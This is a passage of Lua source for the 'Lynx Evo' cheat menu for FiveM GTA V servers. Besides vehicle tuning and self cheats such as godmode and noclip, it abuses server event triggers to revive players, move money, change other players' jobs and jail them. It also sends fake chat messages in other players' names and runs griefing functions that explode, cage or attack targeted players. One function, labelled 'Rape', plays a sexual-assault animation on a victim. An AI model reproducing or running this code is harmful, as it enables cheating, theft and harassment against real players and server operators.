							SetVehicleNeonLightEnabled(veh, 2, oldmodaction)
							SetVehicleNeonLightEnabled(veh, 3, oldmodaction)
							isPreviewing = false
							oldmodtype = -1
							oldmod = -1
						elseif oldmodtype == "paint" then
							local pa,pb,pc,pd = table.unpack(oldmod)
							SetVehicleColours(veh, pa,pb)
							SetVehicleExtraColours(veh,pc,pd)
							isPreviewing = false
							oldmodtype = -1
							oldmod = -1						
						else
							if oldmodaction == "rm" then
								RemoveVehicleMod(veh, oldmodtype)
								isPreviewing = false
								oldmodtype = -1
								oldmod = -1
							else
								SetVehicleMod(veh, oldmodtype,oldmod,false)
								isPreviewing = false
								oldmodtype = -1
								oldmod = -1
							end
						end
					end
				end
				
				
				
				
				if LynxEvo.IsMenuOpened(theItem.id) then
					if theItem.id == "wheeltypes" then
						if LynxEvo.Button("Sport Wheels") then
							SetVehicleWheelType(veh,0)
						elseif LynxEvo.Button("Muscle Wheels") then
							SetVehicleWheelType(veh,1)
						elseif LynxEvo.Button("Lowrider Wheels") then
							SetVehicleWheelType(veh,2)
						elseif LynxEvo.Button("SUV Wheels") then
							SetVehicleWheelType(veh,3)
						elseif LynxEvo.Button("Offroad Wheels") then
							SetVehicleWheelType(veh,4)
						elseif LynxEvo.Button("Tuner Wheels") then
							SetVehicleWheelType(veh,5)
						elseif LynxEvo.Button("High End Wheels") then 
							SetVehicleWheelType(veh,7)
						end
						LynxEvo.Display()
					elseif theItem.id == "extra" then
						local extras = checkValidVehicleExtras()
						for i,theItem in pairs(extras) do
							if IsVehicleExtraTurnedOn(veh,i) then
								pricestring = "Installed"
							else
								pricestring = "Not Installed"
							end
							
							if LynxEvo.Button(theItem.menuName, pricestring) then
								SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh,i))
							end
						end
						LynxEvo.Display()
					elseif theItem.id == "headlight" then

						if LynxEvo.Button("None") then
							SetVehicleHeadlightsColour(veh, -1)
						end

						for theName, theItem in pairs(headlightscolor) do
							tp = GetVehicleHeadlightsColour(veh)

							if tp == theItem.id and not isPreviewing then
								pricetext = "Installed"
							else
								if isPreviewing and tp == theItem.id then
									pricetext = "Previewing"
								else
									pricetext = "Not Installed"
								end
							end
							head = GetVehicleHeadlightsColour(veh)
							if LynxEvo.Button(theItem.name, pricetext) then
								if not isPreviewing then
									oldmodtype = "headlight"
									oldmodaction = false
									oldhead = GetVehicleHeadlightsColour(veh)
									oldmod = table.pack(oldhead)
									SetVehicleHeadlightsColour(veh, theItem.id)
									
									isPreviewing = true
								elseif isPreviewing and head == theItem.id then
										ToggleVehicleMod(veh, 22, true)
										SetVehicleHeadlightsColour(veh, theItem.id)
										isPreviewing = false
										oldmodtype = -1
										oldmod = -1
								elseif isPreviewing and head ~= theItem.id then
									SetVehicleHeadlightsColour(veh, theItem.id)
									isPreviewing = true
								end
							end
						end
						LynxEvo.Display()
					elseif theItem.id == "neon" then
						
						if LynxEvo.Button("None") then
							SetVehicleNeonLightsColour(veh,255,255,255)
							SetVehicleNeonLightEnabled(veh,0,false)
							SetVehicleNeonLightEnabled(veh,1,false)
							SetVehicleNeonLightEnabled(veh,2,false)
							SetVehicleNeonLightEnabled(veh,3,false)
						end
						
						
						for i,theItem in pairs(neonColors) do
							colorr,colorg,colorb = table.unpack(theItem)
							r,g,b = GetVehicleNeonLightsColour(veh)
							
							if colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle,2) and not isPreviewing then
								pricestring = "Installed"
							else
								if isPreviewing and colorr == r and colorg == g and colorb == b then
									pricestring = "Previewing"
								else
									pricestring = "Not Installed"
								end
							end
							
							if LynxEvo.Button(i, pricestring) then
								if not isPreviewing then
									oldmodtype = "neon"
									oldmodaction = IsVehicleNeonLightEnabled(veh,1)
									oldr,oldg,oldb = GetVehicleNeonLightsColour(veh)
									oldmod = table.pack(oldr,oldg,oldb)
									SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)
									SetVehicleNeonLightEnabled(veh,0,true)
									SetVehicleNeonLightEnabled(veh,1,true)
									SetVehicleNeonLightEnabled(veh,2,true)
									SetVehicleNeonLightEnabled(veh,3,true)
									isPreviewing = true
								elseif isPreviewing and colorr == r and colorg == g and colorb == b then
										SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)
										SetVehicleNeonLightEnabled(veh,0,true)
										SetVehicleNeonLightEnabled(veh,1,true)
										SetVehicleNeonLightEnabled(veh,2,true)
										SetVehicleNeonLightEnabled(veh,3,true)
										isPreviewing = false
										oldmodtype = -1
										oldmod = -1
								elseif isPreviewing and colorr ~= r or colorg ~= g or colorb ~= b then
									SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)
									SetVehicleNeonLightEnabled(veh,0,true)
									SetVehicleNeonLightEnabled(veh,1,true)
									SetVehicleNeonLightEnabled(veh,2,true)
									SetVehicleNeonLightEnabled(veh,3,true)
									isPreviewing = true
								end
							end
						end
						LynxEvo.Display()
					elseif theItem.id == "paint" then
						
						if LynxEvo.MenuButton("~h~~p~#~s~ Primary Paint","primary") then
							
						elseif LynxEvo.MenuButton("~h~~p~#~s~ Secondary Paint","secondary") then
							
						elseif LynxEvo.MenuButton("~h~~p~#~s~ Wheel Paint","rimpaint") then
							
						end
						
						
						LynxEvo.Display()
						
					else
						local valid = checkValidVehicleMods(theItem.id)
						for ci,ctheItem in pairs(valid) do
							if ctheItem.menuName == "~h~~b~Stock" then price = 0 end
							if theItem.name == "Horns" then
								for chorn,HornId in pairs(horns) do
									if HornId == ci-1 then
										ctheItem.menuName = chorn
									end
								end
							end
							if ctheItem.menuName == "NULL" then
								ctheItem.menuname = "unknown"
							end
							if LynxEvo.Button(ctheItem.menuName, price) then
								
								
								
								
								
								if not isPreviewing then
									oldmodtype = theItem.id
									oldmod = GetVehicleMod(veh, theItem.id)
									isPreviewing = true
									if ctheItem.data.realIndex == -1 then
										oldmodaction = "rm"
										RemoveVehicleMod(veh, ctheItem.data.modid)
										isPreviewing = false
										oldmodtype = -1
										oldmod = -1
										oldmodaction = false
									else
										oldmodaction = false
										SetVehicleMod(veh, theItem.id, ctheItem.data.realIndex, false)
									end
								elseif isPreviewing and GetVehicleMod(veh,theItem.id) == ctheItem.data.realIndex then
										isPreviewing = false
										oldmodtype = -1
										oldmod = -1
										oldmodaction = false
										if ctheItem.data.realIndex == -1 then
											RemoveVehicleMod(veh, ctheItem.data.modid)
										else
											SetVehicleMod(veh, theItem.id, ctheItem.data.realIndex, false)
										end
								elseif isPreviewing and GetVehicleMod(veh,theItem.id) ~= ctheItem.data.realIndex then
									if ctheItem.data.realIndex == -1 then
										RemoveVehicleMod(veh, ctheItem.data.modid)
										isPreviewing = false
										oldmodtype = -1
										oldmod = -1
										oldmodaction = false
									else
										SetVehicleMod(veh, theItem.id, ctheItem.data.realIndex, false)
										isPreviewing = true
									end
								end
							end
						end			
						LynxEvo.Display()
					end
				end
			end


			
			for i,theItem in pairs(perfMods) do
				if LynxEvo.IsMenuOpened(theItem.id) then
					
					if GetVehicleMod(veh,theItem.id) == 0 then
						pricestock = "Not Installed"
						price1 = "Installed"
						price2 = "Not Installed"
						price3 = "Not Installed"
						price4 = "Not Installed"
					elseif GetVehicleMod(veh,theItem.id) == 1 then
						pricestock = "Not Installed"
						price1 = "Not Installed"
						price2 = "Installed"
						price3 = "Not Installed"
						price4 = "Not Installed"
					elseif GetVehicleMod(veh,theItem.id) == 2 then
						pricestock = "Not Installed"
						price1 = "Not Installed"
						price2 = "Not Installed"
						price3 = "Installed"
						price4 = "Not Installed"
					elseif GetVehicleMod(veh,theItem.id) == 3 then
						pricestock = "Not Installed"
						price1 = "Not Installed"
						price2 = "Not Installed"
						price3 = "Not Installed"
						price4 = "Installed"
					elseif GetVehicleMod(veh,theItem.id) == -1 then
						pricestock = "Installed"
						price1 = "Not Installed"
						price2 = "Not Installed"
						price3 = "Not Installed"
						price4 = "Not Installed"
					end
					if LynxEvo.Button("Stock "..theItem.name, pricestock) then
						SetVehicleMod(veh,theItem.id, -1)
					elseif LynxEvo.Button(theItem.name.." Upgrade 1", price1) then
							SetVehicleMod(veh,theItem.id, 0)
					elseif LynxEvo.Button(theItem.name.." Upgrade 2", price2) then
							SetVehicleMod(veh,theItem.id, 1)
					elseif LynxEvo.Button(theItem.name.." Upgrade 3", price3) then
							SetVehicleMod(veh,theItem.id, 2)
					elseif theItem.id ~= 13 and theItem.id ~= 12 and LynxEvo.Button(theItem.name.." Upgrade 4", price4) then
							SetVehicleMod(veh,theItem.id, 3)
					end
					LynxEvo.Display()
				end
			end

			if LynxEvo.IsMenuOpened("LynxX") then
				local pisellone = PlayerId(-1)
				local pisello = GetPlayerName(pisellone)
				drawNotification("~h~Lynx ~o~Official ~b~8R4 ~p~#~s~"..pisello, false)
				drawNotification("~b~https://~s~www.lynxmenu.com~b~/", false)
				if LynxEvo.MenuButton("~h~~p~#~s~ Self Menu", "SelfMenu") then
				elseif LynxEvo.MenuButton("~h~~p~#~s~ Online Players", "OnlinePlayerMenu") then
				elseif LynxEvo.MenuButton("~h~~p~#~s~ Teleport Menu", "TeleportMenu") then
				elseif LynxEvo.MenuButton("~h~~p~#~s~ Vehicle Menu", "VehicleMenu") then
				elseif LynxEvo.MenuButton("~h~~p~#~s~ Weapon Menu", "WeaponMenu") then
				elseif LynxEvo.MenuButton("~h~~p~#~s~ Lua Menu ~o~~h~:3", "LuaMenu") then
				elseif LynxEvo.MenuButton("~h~~p~#~s~ Advanced Mode ~o~~h~xD", "AdvM") then
				elseif LynxEvo.MenuButton("~h~~p~# ~y~34ByTe Community", "crds") then
				end

				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("SelfMenu") then
				if LynxEvo.CheckBox("~h~~g~Godmode", Godmode, function(enabled) Godmode = enabled end) then
				elseif LynxEvo.Button("~h~~y~Semi ~g~Godmode") then	
					local hashball = "stt_prop_stunt_soccer_ball"
					while not HasModelLoaded(GetHashKey(hashball)) do
						Citizen.Wait(0)
						RequestModel(GetHashKey(hashball))
					end
					local ball = CreateObject(GetHashKey(hashball), 0, 0, 0, true, true, false)
					SetEntityVisible(ball, 0, 0)
					AttachEntityToEntity(ball, GetPlayerPed(-1), GetPedBoneIndex(GetPlayerPed(-1), 57005), 0, 0, -1.0, 0, 0, 0, false, true, true, true, 1, true)
				elseif LynxEvo.CheckBox("~h~~g~Player Visible", invisible, function(enabled) invisible = enabled end) then
				elseif LynxEvo.Button("~h~~r~Suicide") then
					SetEntityHealth(PlayerPedId(-1), 0)
				elseif LynxEvo.Button("~h~~g~ESX~s~ Revive Yourself~s~") then
					TriggerEvent("esx_ambulancejob:revive")
				elseif LynxEvo.Button("~h~~g~Heal/Revive") then
					SetEntityHealth(PlayerPedId(-1), 200)
				elseif LynxEvo.Button("~h~~b~Give Armour") then
					SetPedArmour(PlayerPedId(-1), 200)
				elseif LynxEvo.CheckBox("~h~Infinite Stamina",InfStamina,function(enabled)InfStamina = enabled end) then
				elseif LynxEvo.CheckBox("~h~Thermal ~o~Vision", bTherm, function(bTherm) end) then
				therm = not therm
				bTherm = therm
				SetSeethrough(therm)
				elseif LynxEvo.CheckBox("~h~Fast Run",fastrun,function(enabled)fastrun = enabled end) then
				elseif LynxEvo.CheckBox("~h~Super Jump", SuperJump, function(enabled) SuperJump = enabled end) then
				elseif LynxEvo.CheckBox("~h~Noclip",Noclip,function(enabled)Noclip = enabled end) then			
				end

				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("OnlinePlayerMenu") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and LynxEvo.MenuButton(GetPlayerName(i).." ~p~["..GetPlayerServerId(i).."]~s~ ~y~["..i.."]~s~ "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~h~~r~DEAD" or "~h~~g~ALIVE"), 'PlayerOptionsMenu') then
						SelectedPlayer = i
					end
				end
		

				LynxEvo.Display()
						elseif LynxEvo.IsMenuOpened("PlayerOptionsMenu") then
							LynxEvo.SetSubTitle("PlayerOptionsMenu", "Player Options [" .. GetPlayerName(SelectedPlayer) .. "]")
						if LynxEvo.MenuButton("~h~~p~#~s~ ESX Triggers", "ESXTriggerini") then
						elseif LynxEvo.MenuButton("~h~~p~#~s~ ESX Jobs", "ESXJobs2") then
						elseif LynxEvo.MenuButton("~h~~p~#~s~ VRP Triggers", "VRPPlayerTriggers") then
						elseif LynxEvo.MenuButton("~h~~p~#~s~ Troll Menu", "Trollmenu") then

						elseif LynxEvo.Button("~h~Spectate", (Spectating and "~g~[SPECTATING]")) then
							SpectatePlayer(SelectedPlayer)

						elseif LynxEvo.Button("~h~~r~Semi GOD ~s~Player") then
							local hashball = "stt_prop_stunt_soccer_ball"
							while not HasModelLoaded(GetHashKey(hashball)) do
								Citizen.Wait(0)
								RequestModel(GetHashKey(hashball))
							end
							local ball = CreateObject(GetHashKey(hashball), 0, 0, 0, true, true, false)
							SetEntityVisible(ball, 0, 0)
							AttachEntityToEntity(ball, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0, 0, -1.0, 0, 0, 0, false, true, true, true, 1, true)
						elseif LynxEvo.Button("~h~Teleport To") then
							if confirmtrig then
								local confirm = KeyboardInput("Are you sure? y/n", "", 0)
								if confirm == "y" then
									local Entity = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
									SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
								elseif confirm == "n" then
									drawNotification("~h~~b~Operation cancelled~s~.", false)
								else
									drawNotification("~h~~b~Invalid Confirmation~s~.", true)
									drawNotification("~h~~b~Operation cancelled~s~.", false)
							end
							else
								local Entity = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
								SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
								end
						elseif LynxEvo.CheckBox("~h~Freeze Player", freezeplayer, function(enabled) freezeplayer = enabled end) then
						elseif LynxEvo.MenuButton("~h~~p~#~s~ Give Single Weapon", "GiveSingleWeaponPlayer") then
						elseif LynxEvo.Button("~h~Give ~r~All Weapons") then
							for i = 1, #allWeapons do
								GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
						end	

					elseif LynxEvo.Button("~h~Remove ~r~All Weapons") then
						RemoveAllPedWeapons(PlayerPedId(SelectedPlayer), true)

						elseif LynxEvo.Button("~h~Give ~r~Vehicle") then
							local ped = GetPlayerPed(SelectedPlayer)
							local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
							if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
								RequestModel(ModelName)
								while not HasModelLoaded(ModelName) do
								Citizen.Wait(0)
								end
									local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped)+90, true, true)
								else
									drawNotification("~b~Model is not valid!", true)
						end

						elseif LynxEvo.Button("~h~Send To ~r~Jail") then
							TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(selectedPlayer), 5000, "Jailed")
							TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60)
							TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60)
							TriggerServerEvent("js:jailuser", GetPlayerServerId(selectedPlayer), 45 * 60, "Jailed")

						elseif LynxEvo.Button("~h~~g~Evade ~s~From Jail") then
							local me = SelectedPlayer
							TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(me), 0, "escaperino")
							TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(me), 0)
							TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(me), 0)
							TriggerServerEvent("js:jailuser", GetPlayerServerId(me), 0, "escaperino")
						end


				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("ESXTriggerini") then
			if LynxEvo.Button("~h~~g~Revive Player") then
				local playerPed = GetPlayerPed(SelectedPlayer)
				local coords = GetEntityCoords(playerPed)
				TriggerServerEvent("esx_ambulancejob:setDeathStatus", false)
			
				local formattedCoords = {
					x = ESX.Math.Round(coords.x, 1),
					y = ESX.Math.Round(coords.y, 1),
					z = ESX.Math.Round(coords.z, 1)
				}
			
				RespawnPed(playerPed, formattedCoords, 0.0)
			
				StopScreenEffect('DeathFailOut')
				DoScreenFadeIn(800)
			elseif LynxEvo.Button("~h~~g~Give money to player from your wallet") then
				local result = KeyboardInput("Enter amount of money to give", "", 100)
				if result ~= "" then
					TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
				end
			elseif LynxEvo.Button("~h~~b~Handcuff Player") then
				TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(SelectedPlayer))
			end

			LynxEvo.Display()
		elseif LynxEvo.IsMenuOpened("VRPPlayerTriggers") then
			if LynxEvo.Button("~h~Transfer money from your bank") then 
				local q = KeyboardInput("Enter amount of money to give", "", 100)
				local k = KeyboardInput("Enter VRP PERMA ID!", "", 100)
				if q ~= "" then
					local fromPlayer = GetPlayerServerId(PlayerId());
					TriggerEvent("bank:transfer",  fromPlayer, GetPlayerServerId(SelectedPlayer), q)
					TriggerServerEvent("bank:transfer", k, q)
				end
			end

		LynxEvo.Display()
	elseif LynxEvo.IsMenuOpened("ESXJobs2") then
		if LynxEvo.Button("~h~Set Unemployed") then
			TriggerServerEvent("NB:destituerplayer", GetPlayerServerId(SelectedPlayer))
			UnemployedPlayer(SelectedPlayer)
		elseif LynxEvo.Button("~h~Set ~b~Police ~s~Job") then 
			TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "police", 3)
			PolicePlayer(SelectedPlayer)
		elseif LynxEvo.Button("~h~Set ~o~Mecano ~s~Job") then
			TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "mecano", 3)
			MecanoPlayer(SelectedPlayer)
		elseif LynxEvo.Button("~h~Set ~y~Taxi ~s~Job") then
			TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "taxi", 3)
			TaxiPlayer(SelectedPlayer)
		elseif LynxEvo.Button("~h~Set ~r~Ambulance ~s~Job") then
			TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "ambulance", 3)
			AmbulancePlayer(SelectedPlayer)
		elseif LynxEvo.Button("~h~Set ~g~Real Estate ~s~Job") then
			TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "realestateagent", 3)
			RealEstateAgentPlayer(SelectedPlayer)
		elseif LynxEvo.Button("~h~Set ~r~Car ~b~Dealer ~s~Job") then
			TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "cardealer", 3)
			CarDealerPlayer(SelectedPlayer)
	end

				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("Trollmenu") then
			if LynxEvo.MenuButton("~h~~p~#~s~ Spawn Peds", "SpawnPeds") then
			elseif LynxEvo.Button("~h~~r~Fake ~s~Chat Message") then
				local messaggio = KeyboardInput("Enter message to send", "", 100)
				local cazzo = GetPlayerName(SelectedPlayer)
				if messaggio then
					TriggerServerEvent("_chat:messageEntered", cazzo, { 0, 0x99, 255 }, messaggio)
				end
			elseif LynxEvo.Button("~h~~r~Kick ~s~From Vehicle") then
				ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
			elseif LynxEvo.Button("~h~~y~Explode ~s~Vehicle") then
				if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
					AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
				else
					drawNotification("~h~~b~Player not in a vehicle~s~.", false)
				end
			elseif LynxEvo.Button("~h~~r~Launch ~s~his car") then
				if GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false) ~= 0 then
					local entcoords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
					local enthead = GetEntityHeading(GetPlayerPed(SelectedPlayer))

					local mybro = CreatePed(5, 68070371, entcoords, enthead, true)
					local mybrocar = CreateVehicle(GetHashKey("adder"), entcoords, enthead, true, false)
					SetPedIntoVehicle(mybro, mybrocar, -1)	

				else
					drawNotification("~h~~b~Player not in a vehicle~s~.", false)
				end
			elseif LynxEvo.Button("~h~~r~Banana ~p~Party") then
					local pisello = CreateObject(GetHashKey("p_crahsed_heli_s"), 0, 0, 0, true, true, true)
					local pisello2 = CreateObject(GetHashKey("prop_rock_4_big2"), 0, 0, 0, true, true, true)
					local pisello3 = CreateObject(GetHashKey("prop_beachflag_le"), 0, 0, 0, true, true, true)
					AttachEntityToEntity(pisello, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
					AttachEntityToEntity(pisello2, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
					AttachEntityToEntity(pisello3, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)	
			elseif LynxEvo.Button("~h~~r~Explode") then
				AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0)
				AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true)
			elseif LynxEvo.Button("~h~~r~Rape") then
				RequestModelSync("a_m_o_acult_01")
				RequestAnimDict("rcmpaparazzo_2")
				while not HasAnimDictLoaded("rcmpaparazzo_2") do
					Citizen.Wait(0)
				end

				if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
					local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
					while not NetworkHasControlOfEntity(veh) do
						NetworkRequestControlOfEntity(veh)
						Citizen.Wait(0)
					end
					SetEntityAsMissionEntity(veh, true, true)
					DeleteVehicle(veh)
					DeleteEntity(veh)
				end
				count = -0.2
				for b=1,3 do
					local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
					local rapist = CreatePed(4, GetHashKey("a_m_o_acult_01"), x,y,z, 0.0, true, false)
					SetEntityAsMissionEntity(rapist, true, true)
					AttachEntityToEntity(rapist, GetPlayerPed(SelectedPlayer), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
					ClearPedTasks(GetPlayerPed(SelectedPlayer))
					TaskPlayAnim(GetPlayerPed(SelectedPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
					SetPedKeepTask(rapist)
					TaskPlayAnim(rapist, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
					SetEntityInvincible(rapist, true)
					count = count - 0.4
				end
			elseif LynxEvo.Button("~h~~r~Cage ~s~Player") then
				x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
				roundx = tonumber(string.format("%.2f", x))
				roundy = tonumber(string.format("%.2f", y))
				roundz = tonumber(string.format("%.2f", z))
				local cagemodel = "prop_fnclink_05crnr1"
				local cagehash = GetHashKey(cagemodel)
				RequestModel(cagehash)
				while not HasModelLoaded(cagehash) do
					Citizen.Wait(0)
				end
				local cage1 = CreateObject(cagehash, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
				local cage2 = CreateObject(cagehash, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
				SetEntityHeading(cage1, -90.0)
				SetEntityHeading(cage2, 90.0)
				FreezeEntityPosition(cage1, true)
				FreezeEntityPosition(cage2, true)
			elseif LynxEvo.Button("~h~~r~Hamburgher ~s~Player") then
				local hamburg = "xs_prop_hamburgher_wl"
				local hamburghash = GetHashKey(hamburg)
				local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif LynxEvo.Button("~h~~r~Hamburgher ~s~Player Car") then
				local hamburg = "xs_prop_hamburgher_wl"
				local hamburghash = GetHashKey(hamburg)
				local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hamburger, GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			elseif LynxEvo.Button("~h~~r~Snowball troll ~s~Player") then
				rotatier = true
				x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
				roundx = tonumber(string.format("%.2f", x))
				roundy = tonumber(string.format("%.2f", y))
				roundz = tonumber(string.format("%.2f", z))
				local tubemodel = "sr_prop_spec_tube_xxs_01a"
				local tubehash = GetHashKey(tubemodel)
				RequestModel(tubehash)
				RequestModel(smashhash)
				while not HasModelLoaded(tubehash) do
					Citizen.Wait(0)
				end
				local tube = CreateObject(tubehash, roundx, roundy, roundz - 5.0, true, true, false)
				SetEntityRotation(tube, 0.0, 90.0, 0.0)
				local snowhash = -356333586
				local wep = "WEAPON_SNOWBALL"
				for i = 0, 10 do
					local coords = GetEntityCoords(tube)
					RequestModel(snowhash)
					Citizen.Wait(50)
					if HasModelLoaded(snowhash) then
						local ped = CreatePed(21, snowhash, coords.x + math.sin(i * 2.0), coords.y - math.sin(i * 2.0), coords.z - 5.0, 0, true, true) and CreatePed(21, snowhash ,coords.x - math.sin(i * 2.0), coords.y + math.sin(i * 2.0), coords.z - 5.0, 0, true, true)
						NetworkRegisterEntityAsNetworked(ped)
						if DoesEntityExist(ped) and
							not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
							local netped = PedToNet(ped)
							NetworkSetNetworkIdDynamic(netped, false) 
							SetNetworkIdCanMigrate(netped, true)
							SetNetworkIdExistsOnAllMachines(netped, true)
							Citizen.Wait(500)
							NetToPed(netped)
							GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
							SetCurrentPedWeapon(ped, GetHashKey(wep), true)
							SetEntityInvincible(ped, true)
							SetPedCanSwitchWeapon(ped, true)
							TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
						elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
							TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
						else
							Citizen.Wait(0)
						end
					end
				end
			elseif LynxEvo.Button("~h~~r~Clear ~s~All Props") then
				DeleteObject(ball)
				DeleteObject(pisello)
				DeleteObject(pisello2)
				DeleteObject(pisello3)
				DeleteObject(cage1)
				DeleteObject(cage2)
				DeleteObject(hamburger)
				DeleteObject(tube)
			end

		LynxEvo.Display()
	elseif LynxEvo.IsMenuOpened("SpawnPeds") then
		if LynxEvo.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then
			local pedname = "s_m_y_swat_01"
			local wep = "WEAPON_ASSAULTRIFLE"
			for i = 0, 10 do
				local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
				RequestModel(GetHashKey(pedname))
				Citizen.Wait(50)
				if HasModelLoaded(GetHashKey(pedname)) then
					local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
					NetworkRegisterEntityAsNetworked(ped)
					if DoesEntityExist(ped) and
						not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
						local netped = PedToNet(ped)
						NetworkSetNetworkIdDynamic(netped, false) 
						SetNetworkIdCanMigrate(netped, true)
						SetNetworkIdExistsOnAllMachines(netped, true)
						Citizen.Wait(500)
						NetToPed(netped)
						GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
						SetEntityInvincible(ped, true)
						SetPedCanSwitchWeapon(ped, true)
						TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
					elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
						TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
					else
						Citizen.Wait(0)
					end
				end
			end
		elseif LynxEvo.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
			local pedname = "s_m_y_swat_01"
			local wep = "weapon_rpg"
			for i = 0, 10 do
				local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
				RequestModel(GetHashKey(pedname))
				Citizen.Wait(50)
				if HasModelLoaded(GetHashKey(pedname)) then
					local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
					NetworkRegisterEntityAsNetworked(ped)
					if DoesEntityExist(ped) and
						not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
						local netped = PedToNet(ped)
						NetworkSetNetworkIdDynamic(netped, false) 
						SetNetworkIdCanMigrate(netped, true)
						SetNetworkIdExistsOnAllMachines(netped, true)
						Citizen.Wait(500)
						NetToPed(netped)
						GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
						SetEntityInvincible(ped, true)
						SetPedCanSwitchWeapon(ped, true)
